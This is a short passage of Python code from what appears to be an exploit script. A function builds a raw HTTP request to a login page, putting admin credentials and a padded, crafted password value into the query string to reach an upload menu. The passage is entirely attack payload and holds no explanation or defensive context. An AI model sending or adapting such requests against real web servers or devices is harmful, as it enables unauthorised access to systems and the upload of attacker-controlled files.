...
def upload():
	data = ("GET /login.html?username=admin&password=adminaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaanimda&menu=upload&para=aaa&filename=1 HTTP/1.1\r\n",
        "Host: 127.0.0.1\r\n",
        "\r\n")
	data = ''.join(data)
	return data
